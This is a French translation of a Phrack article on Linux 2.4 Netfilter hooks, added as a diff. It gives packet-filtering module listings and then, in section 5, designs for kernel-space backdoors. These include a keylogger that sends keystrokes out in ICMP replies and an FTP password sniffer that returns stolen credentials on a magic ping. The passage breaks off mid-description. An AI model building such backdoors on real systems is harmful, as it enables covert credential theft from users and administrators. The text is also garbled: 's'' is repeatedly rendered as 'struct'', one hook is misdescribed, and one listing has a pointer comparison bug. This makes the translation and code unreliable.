@@ -1,0 +1,2070 @@
+ Volume 0x0b, Issue 0x3d, Phile #0x0d of 0x0f
+
+|=------------=[ Hacking the Linux Kernel Network Stack ]=---------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------=[ bioforge <alkerr@yifan.net> ]=--------------------=|
+|=------------------=[      Traduit par zul        ]=--------------------=|
+
+
+Sommaire
+
+1 Introduction
+  1.1 Ce qu'est ce document
+  1.2 Ce que n'est pas ce document
+
+2 Les différents hooks de Netfilter et leurs utilisation
+  2.1 Gestion des paquets par le noyau Linux
+  2.2 Les hooks Netfilter pour ipv4
+
+3 Enregistrer et désenregistrer les hooks Netfilter
+
+4 Filtrer les paquets avec Netfilter
+  4.1 Rapide tour d'horizon des fonctions de hook
+  4.2 Filtrage par interface
+  4.3 Filtrage par addresse
+  4.4 Filtrage par port TCP
+
+5 Autres possibilités pour les hooks Netfilter
+  5.1 Cacher les daemons backdoor 
+  5.2 Sniffer de mot de passe FTP via le noyau
+  5.2.1 Le code ... nfsniff.c
+  5.2.2 getpass.c
+
+6 Cacher le traffic réseau a libpcap
+  6.1 SOCK_PACKET, SOCK_RAW et libpcap
+  6.2 Cacher le poignard sous la manteau 
+
+7 Conclusion
+
+A Un firewall leger
+  A.1 Survol
+  A.2 La source lwfw.c
+  
+A.3 lwfw.h
+B Code pour la section 6
+
+
+------[ 1. Introduction
+
+Cette article décrit comment des bizarreries (pas forcement des faiblesses)
+dans la pile réseau du noyau Linux peut être utilisés dans des buts
+malveillants ou pas. Je vous présente ici une discussion sur l'utilisation
+légitime des hooks Netfilter mais aussi une technique qui permet de cacher
+une partie du traffic à un sniffer basé sur Libpcap présent sur la machine
+locale.
+
+Netfilter est un sous-système du kernel Linux 2.4. Netfilter permet de
+réaliser des opérations sur le réseau tel que le filtrage des paquets, de
+la translation d'addresse (NAT)et du tracking de connection en utilisant
+les divers hooks disponibles.  Les hooks Netfilter font parti du code du
+noyau, ils peuvent être compilé statiquement (dans le noyau,en dur) ou sous
+forme de modules.  De plus, ils peuvent enregistrer des fonctions qui
+seront appelés lorsque certains événements réseaux arrivent. Un exemple
+d'un tel événement serait la réception d'un paquet.
+
+------[ 1.1 Ce qu'est ce document
+
+Ce document discute comment un codeur de lkm peut utiliser les hooks
+Netfilter pour filtrer des paquets mais aussi comment le traffic peut etre
+caché à une application utilisant libpcap. Bien que Linux 2.4 possède des
+hooks pour ipv4,ipv6 et DECNET, nous discuterons ici seulement de ipv4.
+Cependant , la plupart de ce qui sera dit sur ipv4 pourra struct'appliquer
+aux autres protocoles. Dans un souci d'apprentissage par l'exemple, un
+module permettant un filtrage simple de paquets est disponible dans
+l'Appendice A. Tous les test et codes de ce document ont été réalisé sur un
+x86 avec un Linux 2.4.5. Le comportement des hooks Netfilter a été testé
+sur la loopback, sur une interface Ethernet et sur un l'interface d'un
+modem Point-to-Point. 
+
+Ce document est aussi ecrit pour moi-même, pour essayer de comprendre
+complètement Netfilter. Je ne garantie pas que les codes qui accompagnent
+ce document ne contiennent aucune erreur même si j'ai testé tous les codes
+que je vous propose. J'ai planté un certain nombre de fois mon noyau et
+j'espere qu'il ne sera pas de meme pour vous. En outre, je n'accepterai
+aucune responsabilité pour d'eventuelles dommages subis en suivant ce
+document. Il convient que le lecteur est une bonne connaissance du langage
+C et de la programmation de Loadable Kernel Modules.
+
+Si vous vous apercevez d'une erreur dans la suite du document, veuillez me
+le faire savoir. Je suis de plus ouvert a toutes suggestions visant à
+améliorer ce document ou donnant d'autres renseignement sur Netfilter 
+
+------[ 1.2 Ce que n'est pas ce document
+
+Ce document n'est pas l'ultime référence sur Netfilter. Ce n'est pas non
+plus une référence sur l'usage des commandes iptables. Si vous voulez en
+savoir plus sur les commandes iptables, consultez les mans.
+
+Sur ce, commencons avec une petite introduction sur l'utilisation de
+Netfilter
+
+
+------[ 2. Les différentes hooks Netfilter et leur utilisation
+------[ 2.1 Gestion des paquets par le kernel Linux
+
+Bien que j'aurai adoré m'interesser aux détails les plus intimes de la
+gestion des paquets par Linx et les evenements antérieurs et postérieuse a
+l'utilisation de chaque hook Netfilet, je ne le ferai pas. La raison en est
+simple : Harad Welte a déja ecrit un tres bon docuement sur le sujet
+"journey of a Packet Through the Linux 2.4 Network Stack". Pour apprendre
+plus sur la gestion des paquets par le kernel, je vous conseillerai donc de
+lire ce document. Pour le moment, il suffit de comprendre que lorsqu'un
+paquet traverse la pile réseau du kernel Linux, il va croiser un certain
+nombre de lieu de hooks ou` le paccket va être analysé puis soit gardé soit
+rejeté. Ce sont les hooks Netfilter .
+
+------[ 2.2 Les hooks Netfilter ipv4
+
+Netfilter définit cinq hooks pour ipv4. La déclaration des symboles pour
+ces hooks se trouver dans linux/netfilter_ipv4.h . Ces hooks sont décrits
+dans la table ci-dessous
+
+Table 1 : Hooks Ipv4 disponibles
+
+Hook Appelé
+NF_IP_PRE_ROUTING Après un test de conformité, avant une décision de
+routage
+NF_IP_LOCAL_IN Apres une decision de routage si le paquet est destiné a
+cet hote
+NF_IP_FORWARD Si le paquet est destiné à une autre interface
+NF_IP_LOCAL_OUT Pour des paquets sortants venant de processus locaux
+NF_IP_POST_ROUTING Juste avant que des paquets sortant " " 
+
+Le hook NF_IP_POST_ROUTING est le premier hook appelé après la réception
+d'un paquet.  C'est le hook qui sera utilisé dans le module présenté un peu
+plus loin.  Evidemment , les autres hooks sont très utiles aussi, mais pour
+l'instant focalisons nous sur NF_IP_POST_ROUTING.
+
+Apres que les fonctions de hooks aient fait leur office, elles doivent
+retourner un des codes prédéfinis de Netfilter. Ces codes sont les suivants:
+
+Table 2 : Code de retour Netfilter
+Code de retour Signification
+NF_DROP Rejeter le paquet
+NF_ACCEPT Garder le paquet
+NF_STOLEN Oublier le paquet
+NF_QUEUE Empiler le paquet pour l'espace utilisateur
+NF_REPEAT Appeller de nouveau la fonction de hook sur ce paquet
+
+Le code de retour NF_DROP signifie que le paquet va être complement ecarté
+et toutes les ressouces utilisées par celui-ci seront libérées.  NF_ACCEPT
+dit à Netfilter que ce paquet est acceptable (de son point de vue) et que
+le paquet peut aller jusqu'a la prochaine étape de la pile réseau.
+NF_STOLEN est un code de retour interessant car il va dire à Netfilter
+d'oublier le paquet. Ce qu'il dit réellement à Netfilter est que la
+fonction de hook va dorenavent struct'occuper struct'occuper du traitement
+de ce paquet et que Netfilter doit arrêter tout traitement sur ce paquet.
+Cela ne signifie pas que les ressources du paquet vont être libérées. Le
+paquet et sa structure sk_buff sont toujours valides, c'est juste que que
+la fonction de hook devient propiétaire du paquet à la place de Netfilter.
+Malheuresement, je ne suis pas exactement certain de ce que fait NF_QUEUE,
+de ce fait je ne discuterai pas dessus. La dernière valeur de retour
+,NF_REPEAT impose à Netfilter d'appeller de nouveau cette fonction de hook.
+Evidemment il faut être prudent dans l'utilisation de NF_REPEAT afin
+d'eviter une boucle sans fin.
+
+
+------[ 3. Enregistrer et desenregistrer des hooks Netfilter
+
+L'enregistrement d'une fonction de hook est un processus tout simple qui
+tourne autour de la structure nf_hook_ops , definie dans linux/netfilter.h.
+La définition de cette structure est la suivante.
+
+struct nf_hook_ops {
+struct list_head list;
+/* User fills in from here down. */
+nf_hookfn *hook;
+int pf;
+int hooknum;
+/* Hooks are ordered in ascending priority. */
+int priority;
+};
+
+Le membre list de cette structure est utiliser pour dresser la liste des
+hooks Netfilter et n'a aucune importance pour l'utilisateur pour
+l'enregistrement du hook est un pointeur vers une fonction nf_hookfn. C'est
+cette fonction qui va être appelé par le hook. nf_hookfn est lui aussi
+defini dans linux/netfilter.h.  Le champ pf spécifie la famille de
+protocole utilisé. L'ensemble des protocoles valides est définis dans
+linux/socket.h mais dans le cas d'ipv4, nous utiliserons PF_INET. Le champ
+hooknum spécifie dans quel hook particulier sera introduite la fonction :
+c'est une des valeurs listées dans la table 1. Enfin, le champ priority
+spécifie à quelle place dans l'ordre d'execution du hook cette fonction
+sera appelé.  Pour ipv4, les valeurs acceptables sont définis dans
+linux/netfilter_ipv4.h dans l'enumeration nf_ip_hook_priorities. Pour les
+besoins du module de présentation, nous utiliserons NF_IP_PRI_FIRST.
+
+L'enregistrement d'un hook Netfilter requiert l'utilisation d'une structure
+nf_hook_ops avec la fonction nf_register_hook(). nf_register_hook() prent
+en argument l'addresse d'une structure nf_hook_ops et retourne un entier
+(int). Cependant, si vous regardez réellement le code de la fonction
+nf_register_hook() dans net/core/netfilter.c, vous noterez qu'il retourne
+toujours 0. Ci-dessous, vous trouvez une exemple de code qui enregistre
+simplement une fonction qui rejette tous les paquets entrants. Ce code vous
+montre aussi comment les valeurs de retour de Netfilter sont interprétés.
+
+
+Listing 1. Registration of a Netfilter hook
+
+/* Sample code to install a Netfilter hook function that will
+* drop all incoming paquets. */
+#define __KERNEL__
+#define MODULE
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+/* This is the structure we shall use to register our function */
+static struct nf_hook_ops nfho;
+/* This is the hook function itself */
+unsigned int hook_func(unsigned int hooknum,
+struct sk_buff **skb,
+const struct net_device *in,
+const struct net_device *out,
+int (*okfn)(struct sk_buff *))
+{
+return NF_DROP; /* Drop ALL paquets */
+}
+/* Initialisation routine */
+int init_module()
+{
+/* Fill in our hook structure */
+nfho.hook = hook_func; /* Handler function */
+nfho.hooknum = NF_IP_PRE_ROUTING; /* First hook for IPv4 */
+nfho.pf = PF_INET;
+nfho.priority = NF_IP_PRI_FIRST; /* Make our function first */
+nf_register_hook(&nfho);
+
+return 0;
+}
+
+/* Cleanup routine */
+void cleanup_module()
+{
+nf_unregister_hook(&nfho);
+}
+
+C'est tout pour ce code .  Avec le code donné dans le listing 1, vous
+pouvez voir que desenregistrer un hook Netfilter revient simplement à
+appeler nf_unregister_hook() avec comme argument l'addresse de la structure
+que vous avez utilisé pour enregistrer le hook.
+
+------[ 4. Techniques basiques de filtrage de paquet avec Netfilter
+------[ 4.1 Une approche plus appronfondie des fonctions de hooks
+
+Il est maintenat temps de regarder quelles sont les données qui passent à
+travers le hook et comment ces données sont utilisés pour prendre une
+décision concernant leur filtrage. Regardons donc plus precisement le
+prototype des fonctions nf_hookfn. Le prototype donné dans
+linux/netfilter.h est le suivant :
+
+typedef unsigned int nf_hookfn(unsigned int hooknum,
+struct sk_buff **skb,
+const struct net_device *in,
+const struct net_device *out,
+int (*okfn)(struct sk_buff *));
+
+Le premier argument de la fonction nf_hookfn est une valeur spécifiant un
+des types de hooks décrit dans la table 1. Le second argument est plus
+interessant, c'est un pointeur sur un pointeur sur une structure sk_buff,
+la structure utilisée dans la pile réseau pour décrire un paquet. Cette
+structure est définie dans linux/skbuff.h et en raison de sa taille, je
+decrirai seulement ses champs les plus interessants.
+
+Les champs les plus importants de la structure sk_buff sont probablement
+les trois unions décrivant l'en-tete de la couche transport (cad UDP,
+TCP,IMCP, SPX), l'entete Internet (cad IPv4/6, IPX, RAW) et l'en-tete de la
+couche de liaison (Ethernet ou RAW). Les noms de ces unions sont
+respectivement h nh et mac. Ces unions contiennent plusieurs structures,
+qui dépendent des protocoles utilisés dans ce paquet. Certains d'entre vous
+auront noté que parfois, l'en-tête de la couche transport et celui de la
+couche Internet semblent pointer au même endroit en mémoire. C'est le cas
+pour les paquets TCP ou h et nh sont tous deux considérées comme des
+pointeurs vers une structure IP. Cela signifie qu'essayer de récupérer la
+valeur de h->th en pensant que h pointe vers l'entete TCP donnera un
+résultat faux car h->th pointe dans l'en-tête et est donc équivalent à
+np->iph.
+
+Les autres champs intéressants sont la longeur(len) et le champ de données.
+La longueur spécifie la longueur totale des données du paquet(on ne
+considère pas la taille des headers). Acutellement, on sait donc comment ,à
+partir d'une structure sk_buff,accéder aux différents en-têtes des
+différents protocoles et recuperer les données du paquet. Quels autres bits
+riches en informations sont encore disponible par l'intermédiaire des
+fonctions de hooks ?
+
+Les deux arguments qui viennent après skb sont des pointeurs vers des
+structures net_device. Les structures net_device sont utilisés par le noyau
+Linux pour décrire les interfaces réseau. La première de ces structures,in,
+est utilisé pour décrire l'interface par laquelle est arrivé le paquet.
+Sans surprise, la structure out décrit l'interface par laquelle le paquet
+va repartir. Il est important de se rendre compte que habituellement,
+seulement une de ces interfaces est fournie. Par exemple, in sera seulent
+seulement fournie pour les hooks NF_IP_PRE_ROUTING et NF_IP_LOCAL_IN. out
+lui sera fournie pour les hooks NF_IP_LOCAL_OUT et NF_IP_POST_ROUTING .
+Pour le moment, je n'ai pas encore testé quelles étaient les structures
+disponibles pour le hook NF_IP_FORWARD mais si vous vous assurez que les
+pointeurs sont non NULL avant de les libérer , vous ne devriez pas avoir de
+problème.
+
+Finalement, le dernier argument passé à une fonction de hook est un
+pointeur de fonction appelé okfn qui prend une structure sk_buff comme
+unique argument et qui retourne un entier. Je ne suis pas trop sur de ce
+que cette fonction fait. En regardant dans net/core/netfilter.c, il y a
+deux endroits ou` okfn est appelé. Cette fonction est appelé dans
+nf_hook_slow() et nf_reinject() lorsqu'un hook Netfilter retourne
+NF_ACCEPT. Si quelqu'un a plus d'informations sur okfn, merci de me le
+faire savoir.
+
+Maintenant que nous avons vu quelles étaient les informations les plus
+importantes et les plus utiles que recevait une fonction de hook, il est
+temps de nous intéresser à l'utilisation de ces informations pour filtrer
+les paquets de différents manières.
+
+
+----[ 4.2 - Filtrage par interface
+
+C'est probablement la méthode de filtrage la plus simple qui soit. Vous
+vous rappellez des structures net_device que notre fonction de hook
+recevait ? Utiliser le champ name de la structure net_device appropriée va
+nous permettre de rejeter les paquets en considérant leur interface de
+départ ou leur interface d'arrivée. Pour rejeter tous les paquets qui
+arrive de l'interface eth0, chacun des paquets doit comparer sa valeur
+in->name avec "eth0". Si les noms correspondent, alors la fonction de hook
+renvoie simplement NF_DROP et le paquet est détruit. C'est aussi simple que
+cela. Le listing 2 donne un échantillon du code permettant de réaliser
+cela. A noter que le module Light-Weight Firewall proposera des exemples
+simples de toutes les techniques de filtrage présentées ici. Il incluera
+aussi une interface IOCTL et une application permettant de modifier
+dynamiquement son comportement.
+
+Listing 2. Filtering paquets based on their source interface
+
+/* Sample code to install a Netfilter hook function that will
+* drop all incoming paquets on an interface we specify */
+#define __KERNEL__
+#define MODULE
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/netdevice.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+/* This is the structure we shall use to register our function */
+static struct nf_hook_ops nfho;
+/* Name of the interface we want to drop paquets from */
+static char *drop_if = "lo";
+/* This is the hook function itself */
+unsigned int hook_func(unsigned int hooknum,
+struct sk_buff **skb,
+const struct net_device *in,
+const struct net_device *out,
+int (*okfn)(struct sk_buff *))
+{
+if (strcmp(in->name, drop_if) == 0) {
+printk("Dropped paquet on %s...\n", drop_if);
+return NF_DROP;
+} else {
+return NF_ACCEPT;
+}
+}
+/* Initialisation routine */
+int init_module()
+{
+/* Fill in our hook structure */
+nfho.hook = hook_func; /* Handler function */
+nfho.hooknum = NF_IP_PRE_ROUTING; /* First hook for IPv4 */
+nfho.pf = PF_INET;
+nfho.priority = NF_IP_PRI_FIRST; /* Make our function first */
+
+nf_register_hook(&nfho);
+
+return 0;
+}
+
+/* Cleanup routine */
+void cleanup_module()
+{
+nf_unregister_hook(&nfho);
+}
+
+N'est ce pas simple ? Maintenant , interessons nous au filtrage basé sur
+les addresses IP.
+
+----[ 4.3 - Filtrage par addresse
+
+Comme lors du filtrage par interface, le filtrage de paquet selon leur
+addresse IP source ou leur addresse IP de destination est très simple.
+Cette fois, nous allons nous interessé à la structure sk_buff. Rappelez
+vous que l'argument skb est un pointeur sur un pointeur sur une structure
+sk_buff. Pour éviter bon nombre de problème, une bonne habitude est de
+déclarer une pointeur séparé vers une structure sk_buff et de lui assigner
+la valeur pointée par skb de la manière suivante :
+
+struct sk_buff *sb = *skb; /* Enleve un niveau d'indirection* /
+
+Vous n'avez plus besoin de deferencer qu' une fois pour accéder aux
+différents éléments de la structure. Obtenir l'en-tête IP d'un paquet se
+fait en utilisant l'entête de la couche Internet de la structure sk_buff.
+Cet entête est contenue dans une union et on peut y accéder via
+sk_buff->nh.iph. La fonction du listing 3 montre comment filtrer des
+paquets en comparant leur IP source à une certaine addresse (à rejeter)
+lorsqu'on lui donne en argument la structure sk_buff du paquet. Ce code est
+direcment tiré du LWFW. Seule différence avec le code LWFW : la partie
+gestion des statistiques a été enlevé.
+
+
+Listing 3. Checking source IP of a received paquet
+
+unsigned char *deny_ip = "\x7f\x00\x00\x01"; /* 127.0.0.1 */
+
+...
+static int check_ip_paquet(struct sk_buff *skb)
+{
+/* We don't want any NULL pointers in the chain to
+* the IP header. */
+if (!skb )return NF_ACCEPT;
+if (!(skb->nh.iph)) return NF_ACCEPT;
+
+if (skb->nh.iph->saddr == *(unsigned int *)deny_ip) {
+return NF_DROP;
+}
+return NF_ACCEPT;
+}
+
+Maintenant si l'addresse source correspond à l'addresse pour laquelle nous
+voulons rejeter tous les paquets, alors le paquet est rejeté. Pour que
+cette fonction marche comme présenté auparavant, il faut que la valeur de
+deny_ip soit stocké selon l'ordre de bit réseau (cad Big-endian, alors que
+le bit order des processeurs Intel est little-endian).Bien qu'il soit peu
+probable que la fonction soit appellé avec un argument NULL, cela ne coute
+rien d'etre un peu paranoiaque (NdT on sait jamais avec ces mechants h4x0rs
+aussi ). Evidemment si on rencontre une erreur, on va renvoyer NF_ACCEPT
+Ainsi Netfilter continuera à traiter le paquet. Le listing 4 présente un
+petit module utilisant un filtrage par addresse, qui va rejeter tous les
+paquets venant d'une certaine addresse IP.
+
+Listing 4. Filtering paquets based on their source address
+
+/* Sample code to install a Netfilter hook function that will
+* drop all incoming paquets from an IP address we specify */
+#define __KERNEL__
+#define MODULE
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/skbuff.h>
+#include <linux/ip.h> /* For IP header */
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+/* This is the structure we shall use to register our function */
+static struct nf_hook_ops nfho;
+/* IP address we want to drop paquets from, in NB order */
+static unsigned char *drop_ip = "\x7f\x00\x00\x01";
+/* This is the hook function itself */
+unsigned int hook_func(unsigned int hooknum,
+struct sk_buff **skb,
+const struct net_device *in,
+const struct net_device *out,
+int (*okfn)(struct sk_buff *))
+{
+struct sk_buff *sb = *skb;
+if (sb->nh.iph->saddr == drop_ip) {
+printk("Dropped paquet from... %d.%d.%d.%d\n",
+*drop_ip, *(drop_ip + 1),
+*(drop_ip + 2), *(drop_ip + 3));
+return NF_DROP;
+} else {
+return NF_ACCEPT;
+}
+}
+/* Initialisation routine */
+int init_module()
+{
+/* Fill in our hook structure */
+nfho.hook = hook_func;
+/* Handler function */
+nfho.hooknum = NF_IP_PRE_ROUTING; /* First for IPv4 */
+nfho.pf = PF_INET;
+nfho.priority = NF_IP_PRI_FIRST; /* Make our func first */
+
+nf_register_hook(&nfho);
+return 0;
+}
+
+/* Cleanup routine */
+void cleanup_module()
+{
+nf_unregister_hook(&nfho);
+}
+
+----[ 4.4 - Filtrage selon le port TCP
+
+Une autre règle simple pour filtrer les paquets se basent sur leur port de
+destination. C'est un peu plus difficile que de vérifier l'addresse IP car
+nous devons créer nous-même un pointeur vers l'entête TCP. Souvenez vous de
+notre discussion précédente sur l'entete de la couche transport et celui de
+la couche réseau. Récuperer un pointeurs vers un entête TCP revient
+simplement à allouer un pointeurs vers une structure tcphdr( défini dans
+linux/tcp.h) et de le faire pointer juste après l'entête IP de notre paquet
+(NdT : euh normalement,il faudrait quand meme verifier que c'est un paquet
+TCP avt de caster comme une brute). Peut-être un exemple aiderait à une
+meilleur compréhension. Le listing 5 présente un code qui permet de filtrer
+les paquets selon un port TCP de destination. Comme pour le listing 3, ce
+code est extrait de LWFW.
+
+unsigned char *deny_port = "\x00\x19"; /* port 25 */
+...
+static int check_tcp_paquet(struct sk_buff *skb)
+{
+struct tcphdr *thead;
+/* We don't want any NULL pointers in the chain
+* to the IP header. */
+if (!skb ) return NF_ACCEPT;
+if (!(skb->nh.iph)) return NF_ACCEPT;
+/* Be sure this is a TCP paquet first */
+if (skb->nh.iph->protocol != IPPROTO_TCP) {
+return NF_ACCEPT;
+}
+thead = (struct tcphdr *)(skb->data +
+(skb->nh.iph->ihl * 4));
+/* Now check the destination port */
+if ((thead->dest) == *(unsigned short *)deny_port) {
+return NF_DROP;
+}
+
+return NF_ACCEPT;
+}
+
+
+En effet, c'est très simple. N'oubliez pas que pour que cette fonction
+marche , il faut que la variable deny_port soit dans l'ordre de bit réseau.
+C'est tout pour les bases du filtrage de paquet. Vous devriez maintenant
+avoir une bonne compréhension de la manière de récupérer les informations
+qui nous intéressent dans un paquet. Nous allons donc passer à des choses
+un peu plus intéressantes.
+
+
+--[ 5 - Autres possibilités des hooks Netfilter
+
+Je vais ici faire quelques propositions pour réaliser quelques choses
+intéressantes avec les hooks Netfilter. La section 5.1 nous donnera
+quelques idées de ce que l'on peut faire, tandis que la section 5.2 sera
+consacré à l'étude et l'écriture d'un sniffer de mot de passe FTP en ring 0
+,qui permet réellement de récuperer des mots de passe à distance. Cela
+marche si bien que ca m'en a fait peur et j'ai décidé de l'ecrire. 
+
+----[ 5.1 - Hidden backdoor daemons
+
+Le devellopement de lkm est probablement un des domaines les plus
+intéressant de la programmation sous Linux. Lorsque vous ecrivez du code
+dans le noyau, votre seule limite est votre imagination. D'un point de vue
+malicieux (qui a dit BlackHat ), vous pouvez cacher des fichiers, des
+processus et tout un tas d'autres choses que n'importe quel rootkit digne
+de ce nom doit savoir faire. D'un point de vue moins malicieux (si si ce
+genre de personne existe réellement), vous pouvez cacher des fichiers, des
+processus et tout un tas d'autre choses (NdT il y a un bug dans la
+Matrice). Le noyau est vraiment un lieu fascinant.
+
+Avec toutes ces ressources disponibles pour la personne qui programme au
+niveau du noyau, on peut imaginer de nombreuses possibilités. La plus
+intéressante ( et aussi la plus effrayante pour l'administrateur) est
+probablement la possibilté d'un backdoor @ l'intérieur même de l'espace
+noyau. Aorès tout, si un backdoor ne tourne pas comme un processus, comment
+savoir qu'il tourne ? Bien sur, il existe un certain nombre de moyen de
+découvrir de tel backdoor dans l'espace noyau, mais pas aussi simple que
+d'executer ps. Toutefois l'idée de mettre un backdoor dans l'espace noyau
+n'est pas nouvelle. Cependant, ce que je vous propose ici est de placer de
+simple service réseau comme backdoor en utilisant , comme vous l'avez
+deviné, les hooks Netfilter.
+
+Si vous avez les compétences nécessaires et le courage de cracher votre
+noyau au nom glorieux de "expérimentation", alors vous pouvez construire
+des services réseaux simples mais utiles, entièrement localisé dans
+l'espace noyau et accessible à distance. De manière évidente, un hook
+Netfilter peut regarder tous les paquets arrivants dans l'attente d'un
+paquet "magique"et lorsque ce paquet "magique" est rec,u, faire
+quelquechose de spécial. Des résultats peuvent alors être envoyés du hook
+Netfilter et la fonction de hook peut renvoyer NF_STOLEN, ainsi le paquet
+"magic" n'ira pas plus loin. Notez cependant que ... Par consequent,
+l'espace utilisateur ignore totalement que lepaquet magique est arrivé,
+mais il peut toujours voir les paquets sortant. Et attention : Ce n'est pas
+parce que un sniffer sur la machine compromise ne peut pas voir le paquet
+que votre paquet est invisible. Un sniffer placé sur une machine
+intermédiaire peut voir votre paquet.
+
+Kossak et Lifeline ont écrit un excellent article pour Phrackqui décrit
+comment on peut faire ce genre de chose en enregistrant divers traiteurs de
+paquets (google traduction powa . Quoi que ce document se limite aux hooks
+Netfilter, je vous conseille quand même de lire leur article( Issue 55,
+file 12) car c'est un article comportant de nombreuses idées intéressantes.
+
+Quel genre de travail peut donc faire un backdoor basé sur les hooks
+Netfilter ? Nous allons vous donner quelques suggestions
+-- Key-logger avec accès distant. Un module va noter les différentes
+   frappers. Les résultats seront envoyés à un ho^te distant quand cette ho^te
+   enverra une requête ping. Ainsi le flux des frappes pourra ressembler à un
+   flux régulier (attention au flood) de réponses à un ECHO_REQUEST. Bien
+   evidemment, on pourra implémenter une leger cryptage sur les données afin
+   de brouiller les pistes : cela évitera par exemple qu'un administrateur
+   suspicieux s'apercoivent que ces données correspondent à ce qu'il
+   vient de taper lors de sa sesssion ssh.
+-- Diverses taches simples d'administations comme par exemple récuperer la
+   liste des comptes actuellement logés sur la machine ou bien obtenir des
+   informations sur les connections en cours
+-- Meme si cela n'a aucun rapport avec un backdoor, on peut imaginer un
+   module sur le périmètre du réseau qui va bloquer tous le traffic dont on
+   suppose qu'il vient de troyens , d'un logiciel de p2p ou d'un (IMCP covert
+   channel).
+-- un "serveur" de transfert de fichiers . J'ai récemment implémenté cette
+   idée. De nombreuses heures de plaisir pour réaliser ce lkm.
+-- Packet bouncer. Cela permet de rediriger les paquets venant d'un certain
+   port sur une autre IP et un autre port puis de retourner les paquets à
+   l'émetteur par la même voie. Aucun processus ne sera utilisé et encore
+   mieux , aucune socket ne sera ouverte.
+-- Un tel paquet bouncer peut être utilisé pour faire communiquer de
+   manière semi-couverte des systèmes critiques, comme par exemple lors de la
+   configuration d'un routeur.
+-- Un sniffer de mots de passe pour FTP/POP3/Telnet . Le module récupère
+   les mots de passe sortant et sauvegarde ces informations en attendant de
+   les envoyer lorsq'un paquet magic arrivera.
+
+Bien, ceci était une courte liste d'idées. La dernière présentée va
+maintenat être étudiée de plus près dans la prochaine section . Cela nous
+donnera l'occasion de regarder de plus près le fonctionnement interne du
+code réseau du kernel. 
+
+----[ 5.2 - Un sniffer de mots de passe FTP
+
+Il est présenté ici un module simplue qui agira comme un backdoor basé sur
+Netfilter, comme envisagé précedemment. Ce module va sniffer les paquets
+FTP sortant à la recherche d'une paire USER/PASS destiné à un serveur FTP.
+Quand une telle pair est trouvé, le module devrai attendre un paquet
+magique de ping et repondra par un IMCP ECHO assez gros pour contenrir
+l'addresse Ip du serveur et le couple nom d'utilisateur et mot de passe.
+(NdT version tres perso). En outre est fournie un petit hack qui permet
+d'envoyer un paquet magique, de récupérer la réponse et d'afficher les
+informations récupérées. Une fois que le couple nom d'utilisateur/mot de
+passe a été envoyé par le module, on peut chercher à lire la prochaine
+paire. Notez bien qe le module ne stocke qu'une pair à la fois.
+Maintenant, après ce bref tour d'horizon, il est temps de regarder plus
+précisement comment le module va faire toutes ces choses.
+
+Quand le module est chargé , la fonction du module init_module() va
+simplement enregistré deux hooks Netfilter. Le premier est utilisé pour
+sniffer le réseau entrant (fonction placée dans NF_IP_PRE_ROUTING) dans
+l'attente d'une paquet IMCP magique. Le deuxième lui est utilisé pour voir
+le traffic sortant de la machine ( fonction placée sur NF_IP_POST_ROUTING).
+Il va chercher et capturer les paquets FTP ou` il voit un USER ou un PASS.
+La fonction cleanup_module() va simplement désenregistrer ces deux hooks.
+
+La fonction watch_out() est utilisé pour hooker NF_IP_POST_ROUTING. En
+regardant le code cette fonction, vous pouvz voir qu'il struct'agit en fait
+d'opérations simples. Quand un paquet entre dans la fonction, il passe par
+différents contro^les pour vérifier qu"il struct'agit d'un paquet FTP. Si
+ce n'est pas le cas, on retourne immédiatemment NF_ACCEPT. Si il
+struct'agit d'un paquet FTP, le module vérifié alors si il ne stocke pas
+déja une paire nom d'utilisateur/mot de passe. Si c'est le cas ( signalé
+par la non-nullité de la variable have_pair) alors NF_ACCEPT est retourné
+et le paquet peut quitter le système. Dans les autres cas, la procédure
+check_ftp() est appelée. C'est ici qu'à lieu pour le moment l'extration des
+mots de passe a lieu. Si aucun autre paquet n'a été rec,u précedemment, les
+champs target_ip et target_port sont vidées.
+
+La fonction check_ftp() va commencer par rechercher les termes "USER",
+"PASS" ou "QUIT" en debut de paquet. A noter que la commande PASS ne sera
+pas traitée tant qu'une requête USER n'a pas été traitée. Cela évite les
+blocages (deadlock) qui peuvent arriver lorsque , pour une raison
+quelconque , la commande PASS arrive en premier et donc la connection cesse
+avant que la commande USER arrive. En outre, si une commande QUIT arrive
+alors que seul un nom d'utilisateur ait été sniffé, alors toutes les
+variables sont mises à zéro : ainsi on pourra recommencer à sniffer une
+nouvelle connection. Lorsqu'une commande USER ou PASS arrive, si les
+précédents tests de conformité ont été passé, l'argument de la commande est
+copié. Juste avant que check_ftp() se termine normalement, la fonction
+vérifie si elle a maintenant un nom d'utilisateur et un mot de passe
+valide. Si c'est le cas, on donnera une valeur non nulle à have_pair :
+ainsi plus aucun nom d'utilisateur ou mot de passe ne sera récupéré tant
+que la paire courante n'a pas été envoyée .
+
+Jusqu'ici vous avez vu comment le module struct'installe et recherche les
+noms d'utilisateurs et les mots de passes. Nous allons maintenant nous
+interesser à ce qu'il va se passer lorsque le paquet magique arrive.
+Faites particulièrement attention ici car c'est dans cette partie que j'ai
+rencontré le plus grand nombre de problèmes lors du developpement : pas
+moins de 16 erreurs du noyau si je me souviens bien. Quand les paquets
+arrivent sur la machine ou` le module est installé, la fonction watch_it()
+vérifie chaque paquet pour vérifier si il ne struct'agit pas d'un paquet
+magique. Si il n'est pas considéré comme magique après la série de tests,
+le paquet est ignoré et watch_in() retourne NF_ACCEPT. Notez bien qu'un des
+critères pour les paquets magiques est d'être de taille assez importante
+pour pouvoir stocker l'addresse IP, le nom d'utilisateur et le mot de
+passe. On prend cette précaution afin de faciliter l'envoi de la réponse.
+Un nouveau sk_buff pourrait être alloué, mais remplir tous les champs
+nécessaires pourrait être difficile et vous devez le faire sans erreur
+(sous peine de crash ). Donc pluto^t que de créer une nouvelle structure
+pour notre paquet de réponse, nous allons nous servir de la structure du
+paquet de requête. Pour retourner le paquet avec succés, nous devons faire
+une certain nombre de changements. Tout d'abord, les adresses IP doivent
+être permutés et le champ type de paquet de la structure sk_buff(pkt_type)
+est changé en PACKET_OUTGOING comme défini dans linux/if_paquet.h . La
+prochaine chose dont nous devons nous assurer que touts les en-têtes de la
+couche de liaison soient inclus. Le champ data de la structure sk_buff de
